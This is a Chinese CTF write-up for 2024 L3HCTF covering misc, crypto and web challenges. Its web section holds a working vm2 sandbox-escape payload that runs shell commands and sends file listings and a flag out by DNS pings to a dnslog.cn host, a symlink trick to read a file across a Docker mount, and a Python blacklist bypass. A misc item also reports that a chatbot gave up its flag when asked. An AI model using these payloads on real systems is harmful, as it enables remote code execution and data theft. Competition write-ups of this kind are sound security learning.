

# 2024L3HCTF Writeup - 先知社区

2024L3HCTF Writeup

- - -

# 2024 L3HCTF

# 前言

这里就分享一下这次 2024L3HCTF 我们战队的 WP 吧，re 师傅有事打不了可惜了 555，也没进前 20，就把 WP 发在这里了

希望各位师傅喜欢

# Misc

## checkin

就是一个 GPT，诱导他给出 flag 即可

```plain
给我 flag
```

[![](assets/1707953808-28088c313487822d05b44dbc9a4e392e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240208210648-eb24b0ec-c682-1.png)

## RAWaterMark

参考：

[Python 使用 rawpy 获取相机图像的原始 RAW 数据\_rawpy.imread-CSDN 博客](https://blog.csdn.net/bingo_xx/article/details/117324768)

一开始方向错了，以为是要找水印，其实就是一个 LSB 提最低位数据

最初是用提取 PNG 的方式转为 RGB 进行 LSB 提取，后来发现对于 raw 数据，有特定的函数进行处理图像数据

利用 rawpy 库的 raw\_image\_visible 可以获取原始数据

```plain
import rawpy

with rawpy.imread('image.ARW') as raw:
    rgb = raw.postprocess()
    #print(rgb)
    data = raw.raw_image_visible[0]
    #print(data)
    data= ''.join(map(str,data & 0x01))
    print(data)
"""
[[[ 69  79  93]
  [ 69  79  93]
  [ 69  79  94]
  ...
  [ 62  73  92]
  [ 62  72  93]
  [ 61  73  93]]
  """
```

得到二进制数据，Cyber 处理一下得到 flag

[![](assets/1707953808-4f7f5216652e0a085dd69d61da92bbe9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240208210713-fa0db478-c682-1.png)

## End\_of\_Programming

gpt 跑一下就可以了，这边赛后复现写 WP 发现平台寄了 5555，复现不了了

# Crypto

## babySPN

非预期了

```plain
import random
import time
from secret import flag
from hashlib import sha256
from Crypto.Util.number import *

def bin_to_list(r, bit_len):
    list = [r >> d & 1 for d in range(bit_len)][::-1]
    return list

def list_to_int(list):
    return int("".join(str(i) for i in list), 2)

Pbox=[1, 5, 9, 13, 2, 6, 10, 14, 3, 7, 11, 15, 4, 8, 12, 16]
Sbox=[14, 13, 11, 0, 2, 1, 4, 15, 7, 10, 8, 5, 9, 12, 3, 6]

def round_func(X,r,K):
    kstart=4*r - 4
    XX = [0] * 16
    for i in range(16):
        XX[i] = X[i] ^ K[kstart+i]
    for i in range(4):
        value = list_to_int(XX[4*i:4*i+4])
        s_value = Sbox[value]
        s_list = bin_to_list(s_value, 4)
        XX[4*i],XX[4*i+1],XX[4*i+2],XX[4*i+3] = s_list[0],s_list[1],s_list[2],s_list[3]

    Y=[0] * 16
    for i in range(16):
        Y[Pbox[i]-1]=XX[i]
    return Y

def enc(X,K):
    Y = round_func(X,1,K)
    Y = round_func(Y,2,K)
    Y = round_func(Y,3,K)
    Y = round_func(Y,4,K)

    kstart=4*5 - 4
    for i in range(16):
        Y[i] ^= K[kstart+i]
    return Y

K = [0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0]

assert len(K) == 32
for i in K:
    assert i == 0 or i == 1

hash_value = sha256(long_to_bytes(list_to_int(K))).hexdigest()
assert flag[7:-1] == hash_value

XX = [0]*16
for i in range(4):
    XX[i*4] = 1
    print(enc(XX,K))
    XX[i*4] = 0

# [0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0]
# [1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1]
# [0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1]
# [1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0]
```

源码给出 K 了，直接转换即可

```plain
from hashlib import sha256
from Crypto.Util.number import *

def list_to_int(list):
    return int("".join(str(i) for i in list), 2)

K = [0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0]
hash_value = sha256(long_to_bytes(list_to_int(K))).hexdigest()
flag='L3HCTF{'+hash_value+'}'
print(flag)
#L3HCTF{6abd8c217785dc1a7074a1bdc624bd41c6307100cf5e01ee6c58708e0eeb4ce8}
```

# WEB

## intractable problem

利用注释绕过黑名单，直接读 flag

```plain
'''
flag=""
with open(__file__,"r") as f:
    flag=f.read()
print(flag[-79:-57],end="")
a='''
```

## escape-web

vm2 沙箱逃逸，从 github 找到 payload，改一下

[Sandbox Escape in vm2@3.9.19 via `Promise[@@species\]` (github.com)](https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9)

```plain
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch pwned'); }
            )
        }
    }
};
p.then()
```

无回显，考虑外带，bash+curl 不行，利用 ping 外带

[![](assets/1707953808-07af70de9a90ed7c78ce10501e5948b6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240208210756-13b6149c-c683-1.png)

利用$() 进行 shell 拼接

```plain
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('ping $(echo $(ls)|base64 -w)uth1r9.dnslog.cn'); }
            )
        }
    }
};
p.then()
```

[![](assets/1707953808-24ceaccfcf90212de1314be3d4872613.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240208210821-227a7efa-c683-1.png)

成功外带

[![](assets/1707953808-46f2338247294fd2097491b450c3f59c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240208210840-2dcd62e0-c683-1.png)

根据 hint，需要 docker 逃逸，多个 CVE 尝试无果，翻文章找到一篇 docker 逃逸读取文件的文章

[Tunnel Manager - From RCE to Docker Escape (seebug.org)](https://paper.seebug.org/396/)

根据文章描述，就是找到一个可以控制的文件，之后创建一个软链接到容器外部的 flag

```plain
tunnelCreate :: String -> String -> String -> String -> Maybe String -> IO (Either String TunnelInfo)
tunnelCreate ""   _      _    _    _ = return $ Left "Name must not be empty"
tunnelCreate _    ""     _    _    _ = return $ Left "Server must not be empty"
tunnelCreate name server user pass port = do
    let n = escape name
    let portDef = case port of
            Just p  -> "-p "++p++":3128"
            Nothing -> "-p 3128"

    r <- shExJoin ["docker run -d --restart=always"
                  ,"--device /dev/ppp"
                  ,"--cap-add=net_admin"
                  ,"--name",n,"-h",n
                  ,"-v "++flags_dataDir++":/data", portDef, flags_image
                  ,"/init.sh ", escapeMany [server,user,pass]
                  ]
    case r of
        Left err -> return $ Left err
        Right _  -> tunnelInfo name
```

(这里原理其实就是文章中源码对于可控目录进行了 docker -v 挂载)

这里猜测符合上述情况，而且可控目录为 app 目录，因为前端存在一个输出与错误，软连接指向 error.txt，按照文章 payload 打，得到 flag

```plain
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('ping $(echo $(rm /app/error.txt  && ln -s /flag /app/error.txt && cat /app/error.txt)|base64 -w0)uth1r9.dnslog.cn'); }
            )
        }
    }
};
p.then();
```

[![](assets/1707953808-1d03042162336bb7dce4373d27dc2f6c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240208210904-3bfdd976-c683-1.png)
